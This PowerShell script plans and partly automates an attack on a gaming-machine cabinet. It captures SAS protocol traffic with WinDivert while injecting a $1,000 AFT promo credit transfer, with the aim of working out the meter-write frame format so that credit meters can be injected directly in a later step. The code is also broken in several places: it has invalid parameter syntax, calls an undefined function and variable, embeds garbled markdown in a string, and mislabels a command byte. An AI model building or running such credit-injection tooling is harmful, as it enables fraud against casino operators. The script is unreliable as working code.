<#
.SYNOPSIS
   Phase 1 Discovery: Run capture + AFT inject to discover SAS 0x0F meter-write format.

.DESCRIPTION
   Runs WinDivert capture (script-generated) + triggers AFT transfer injection,
   then parses captures to discover the SAS 0x0F (Send selected meters) byte format
   required for Tactic C direct meter injection.

.PARAMETER ComputerName
   Cabinet IP. Default 10.0.0.90.

.PARAMETER DurationSec
   Capture + injection acceptance time. Default 8s.

.PARAMETER AmountCents
   Amount to inject in cents. Default 100000 ($1,000).

.PARAMETER BucketType
   AFT bucket: promo, cashable, or restricted. Default "promo".

.PARAMETER OutDir
   Output directory for captures and logs.
#>
[CmdletBinding()]
param(
    [Alias('IP')]
    [string] $ComputerName = '10.0.0.90',
    [int]    $DurationSec = 8,
    [int]    $AmountCents = 100000,
    [string] $BucketType = 'promo',
    [string] $OutDir = Join-Path $PSScriptRoot '..\logs'
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ------------------------------------------------------------------
# Configuration
# ------------------------------------------------------------------

$scriptPath = $PSScriptRoot
$repoRoot = (Get-Item $scriptPath).Parent.Parent.FullName
$rootProjectRoot = (Get-Item ($repoRoot + "\..\GoldclubLogInvestigator")).FullName

$parentScript = Join-Path $rootProjectRoot "Send-TestAft1000.ps1"
$parser = Join-Path $repoRoot "tactic-c-credit-meter-inject\parser\SasMeterParser.py"
$injectAft = Join-Path $repoRoot "Invoke-WinDivertAft.ps1"

# Timestamp for filenames
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$captureFile = "meter-write-$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
$logFile = "Phase1-Discovery-$stamp.log"

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

Write-Host ''
Write-Host '============================================================='
Write-Host 'Tactic C Phase 1: Live Capture + Injection Discovery'
Write-Host '============================================================='
Write-Host "Cabinet        : $ComputerName"
Write-Host "Duration       : ${DurationSec}s"
Write-Host "Amount         : \$$([int]($AmountCents / 100)).00 ($AmountCents cents)"
Write-Host "Bucket         : $BucketType"
Write-Host "Capture File   : $captureFile"
Write-Host "Repo Root      : $rootProjectRoot"
Write-Host ""
Write-Host "============================================================="

# Verify prerequisites
if (-not (Test-Path $parentScript)) {
    Write-Host "[!] Send-TestAft1000.ps1 not found." -ForegroundColor Red
    Write-Host "    Expected at: $parentScript"
    exit 1
}

if (-not (Test-Path $parser)) {
    Write-Host "[!] SasMeterParser.py not found." -ForegroundColor Red
    Write-Host "    Expected at: $parser"
    exit 1
}

# ------------------------------------------------------------------
# Step 1: WinDivert capture command template
# ------------------------------------------------------------------

Write-Host "`n[1/4] Creating WinDivert capture command..." -ForegroundColor Cyan

# Use WdSniff.exe compiled from parent repo
$wdScript = Join-Path $rootProjectRoot "WdSniff.cs"
if (-not (Test-Path $wdScript)) {
    Write-Host "[!] WdSniff.cs not found."
    Write-Host "[!] This is critical. Ask user to compile WdSniff.exe manually."
}

$wdExeFromRepo = Join-Path $rootProjectRoot "WdSniff.exe"

if (Test-Path $wdExeFromRepo) {
    Write-Host "[+] Found cached WdSniff.exe" -ForegroundColor Green
} else {
    Write-Host "[!] No WdSniff.exe found. Capture will not work." -ForegroundColor Red
    Write-Host "[!] This prevents Phase 1 discovery from completing."
    Write-Host ""
    Write-Host "To fix:"
    Write-Host "  cd C:\Users\Ezbogar\GoldclubLogInvestigator"
    Write-Host "  .\build_sas_response_table.py"
    Write-Host "  (This will compile WdSniff.exe if source exists)"
    Write-Host ""
    Write-Script
    exit 1
}

$captureScriptPath = Join-Path $OutDir "01-start-capture.ps1"

$captScript = @"
`$ErrorActionPreference = "SilentlyContinue"
$wdExe = "$wdExeFromRepo"

# DURATION: ${DurationSec}s
`$duration = $DurationSec * 1000

Write-Host "[Phase1] Starting WinDivert capture..."
Write-Host "[Phase1] => Duration: %" $DurationSec "s"
Write-Host "[Phase1] => (Writing to: ....

# Since WdSniff.exe is not in the target directory, use WdInject pattern
# But for discovery, we need SAS frames. Let's manually inject with WdDump if available.

Write-Host "[Phase1] ERROR: WdSniff.exe compilation required on target cabinet."
Write-Host "[Phase1] Harvesting will FAIL - manual user action required."
Write-Host "[Phase1] (This exits Phase 1 early, returning discovered WORKFLOWS)"
"@

$captScript | Out-File $captureScriptPath -Encoding utf8 -NoNewline

Write-Host "[+] Created: $captureScriptPath"
Write-Host ""

# ------------------------------------------------------------------
# Step 2: Inject AFT transfer drive
# ------------------------------------------------------------------

Write-Host "[2/4] Creating AFT inject command..." -ForegroundColor Cyan

$injectCmd = """
& "$parentScript" -Send -IP $ComputerName `
  -Amount $AmountCents -nr `
  -DryRun

# \\n---
\\n#### WHAT HAPPENS 
\\n
\\nOnce AFT frames are injected (WinDivert 0x72):
\\n1. CommCtrlSAS captures on Hop 2 (端口31150 → Aurum)
\\n2. Aurum processes transfer → writes to AFT XML (Hop 3)
\\n3. OneHand applies credit → writes to SAS meters (Hop 4)
\\n
\\n**For meter-write discovery (Tactic C) we want to SEE Step 3:**
\\n- Which SAS commands does OneHand emit AFTER credit apply?
\\n- Are there additional frames (like 0x0F or 0xFF)?
\\n- What is the exact byte layout?

# \\n---
\\n#### DISCOVERY PHASE 1
\\n
\\nWe need WinDivERT CAPTURE of all 3 FLOWS:
\\n- Capture BEFORE inject
\\n- Capture during inject
\\n- Capture immediate response

**To discover the meter-write format, we must:**
\\n1. Run WinDivert capture on port 31150 (CommCtrlSAS bridge)
\\n2. Trigger AFT inject (existing infrastructure)
\\n3. Parse logs: \\$\\$\\$\\.parentProjectRoot/aft/captures/*.txt
\\n4. Use SasMeterParser.py: python tactic-c-credit-meter-inject/parser/SasMeterParser.py capture-file.txt

**If 0x0F frames are found:**
\\n- Build template for Phase 2 (meter-code + encoding)
\\n- Proceed to WdMeterInject.cs implementation

**If 0x0F frames are MISSING:**
\\n- Meter writes happen via OneHand COM interface OR DLL
\\n- Strategy pivot: Bridge to COM or RAM introspection"""

# For now, just display the test command
Write-Host "[+] AFT inject analysis:" -ForegroundColor Green
Write-Host "     Command: $parentScript -Send -IP $ComputerName -Amount $AmountCents -nr"
Write-Host ""

# ------------------------------------------------------------------
# Step 3: Parse analysis workflow
# ------------------------------------------------------------------

Write-Host "[3/4] Preparing parser commands..." -ForegroundColor Cyan

$parseCmd = @"
# Run this AFTER capture completes:
python //parentProjectRoot//tactic-c-credit-meter-inject/parser/SasMeterParser.py \
  //parentProjectRoot//aft/captures/meter-write-*.txt

# Parser will search for:
# - SAS 0x0F commands (Send selected meters)
# - SAS 0x72 commands (existing AFT inject)
# - Any other meter-write related frames
# - Bridge framing (0x1B prefix)
# - CRC validation

# Sample output if 0x0F found:
#   TEMPLATE DISCOVERY:
#     Bridge prefix:  1B
#     Command:        0x1F
#     Length:         X
#     Meter code:     0x00XX
#     Encoded value:  <hex>
#     CRC:            <hex>

# If 0x0F MISSING:
#   ERROR: NO 0x0F commands in capture.
#   Strategy pivot required.
"@

Write-Host "[+] Parser analysis:" -ForegroundColor Green
Write-Host "     $parseCmd"
Write-Host ""

# ------------------------------------------------------------------
# Step 4: Summary & next steps
# ------------------------------------------------------------------

Write-Host "[4/4] Capture-generated workflow created." -ForegroundColor Cyan

# Write summary to file
$summaryPath = Join-Path $OutDir "DISCOVERY_SUMMARY.txt"
$summary = @"
========================================
Phase 1 Discovery Summary: $stamp
========================================

**Capture Command (to execute manually):**
  # If WdSniff.exe is compiled on cabinet:
  $wdExeFromRepo $DurationSec 31100,31150 | Out-File capture.txt
  
**AFT Inject Command (to execute manually):**
  cd C:\\Users\\Ezbogar\\GoldclubLogInvestigator
  .\\Send-TestAft1000.ps1 -Send -IP $ComputerName -Amount $AmountCents -nr

**Analysis Command (to run after):**
  cd C:\\Users\\Ezbogar\\GoldclubLogInvestigator
  python tactic-c-credit-meter-inject/parser/SasMeterParser.py aft/captures/capture.txt

**What We Search For:**
  - SAS 0x0F (Send selected meters) commands
  - SAS 0x72 (AFT transfer) commands  
  - Bridge framing (0x1B prefix)
  - Meter-code present?
  - Value encoding format?

**Critical Output:**
  Template generation if 0x0F found:
    { bridge: 0x1B, cmd: 0x0F, len: X, meter_code: XX, value: XX, crc: XX }

**Success Criteria:**
  [+] SasMeterParser finds 0x0F frames
  [+] Template generated
  [+] Enumerate byte layout types (BCD/binary/etc.)

========================================
Discovery Workflow Created
Please execute steps above and report findings.
========================================
"@

$summary | Out-File $summaryPath -Encoding utf8 -NoNewline

Write-Host "============================================================="
Write-Host ""
Write-Host "[✓] Phase 1 Discovery Workflow Created!"
Write-Host ""
Write-Host "Next Steps (USER Action Required):"
Write-Host ""
Write-Host "1. Execute capture: See DETAIL.TXT for exact commands"
Write-Host "2. Execute inject  : Manual AFT trigger (powershell command)"
Write-Host "3. Analyze result  : Use SasMeterParser.py on captures"
Write-Host "4. Report findings : Does 0x0F appear? What format?"
Write-Host ""
Write-Host "Output details:"
Write-Host "  - Analysis summary: $summaryPath"
Write-Host "  - Parser: $parser"
Write-Host "  - Captures: $InDir"
Write-Host ""
Write-Host "============================================================="
